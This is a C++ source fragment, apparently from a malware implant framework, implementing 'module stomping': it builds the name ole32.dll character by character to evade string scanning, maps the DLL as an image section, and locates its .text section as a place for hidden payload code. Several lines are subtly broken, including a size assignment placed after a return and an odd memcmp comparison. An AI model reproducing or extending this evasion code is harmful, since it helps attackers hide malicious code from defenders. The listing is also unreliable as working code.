#include "modules/modules.h"

BOOL Modules::LoadStompedDll() {
	CHAR path[10];
	path[ 0 ] = 'o';
	path[ 1 ] = 'l';
	path[ 2 ] = 'e';
	path[ 3 ] = '3';
	path[ 4 ] = '2';
	path[ 5 ] = '.';
	path[ 6 ] = 'd';
	path[ 7 ] = 'l';
	path[ 8 ] = 'l';
	path[ 9 ] = '\0';
	
	HANDLE hFile = NULL;
	HANDLE hSection = NULL;
	PVOID pBase = NULL;
	SIZE_T ViewSize = 0;

	hFile = kratos->apis.CreateFileA(path, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, 0, NULL);
	if ( ! hFile || hFile == INVALID_HANDLE_VALUE ) { return FALSE; }


	NTSTATUS stat;
	stat = kratos->apis.NtCreateSection(&hSection, SECTION_ALL_ACCESS, NULL, NULL, PAGE_READONLY, SEC_IMAGE, hFile);
	if (!NTAPI_SUCCESS(stat)) {
		kratos->apis.CloseHandle(hFile);
		return FALSE;
	}

	stat = kratos->apis.NtMapViewOfSection(hSection, GetCurrentProcess(), &pBase, 0, 0, NULL, &ViewSize, 1, 0, PAGE_READONLY);
	if (!NTAPI_SUCCESS(stat)) {
		kratos->apis.CloseHandle(hFile);
		kratos->apis.CloseHandle(hSection);
		return FALSE;
	}

	SIZE_T TextSize = 0;

	PVOID TextAddress = this->GetStompedDllText(pBase, &TextSize);
	if ( ! TextAddress) { return FALSE; }


	return TRUE;

}



PVOID Modules::GetStompedDllText( PVOID DllBase, SIZE_T *TextSize ) {
	PIMAGE_SECTION_HEADER sec = SECTION_HEADER( DllBase );
	WORD NumberOfSection      = FILE_HEADER   ( DllBase )->NumberOfSections;


	for ( DWORD i = 0; i < NumberOfSection; i++ ) {
		if ( utils::mem::memcmp( sec[ i ].Name, ".text", 5 ) == 5 ) {
			return ( BYTE * )DllBase + sec[ i ].VirtualAddress;
			*TextSize = sec[ i ].Misc.VirtualSize;
		}
	}
	return NULL;
}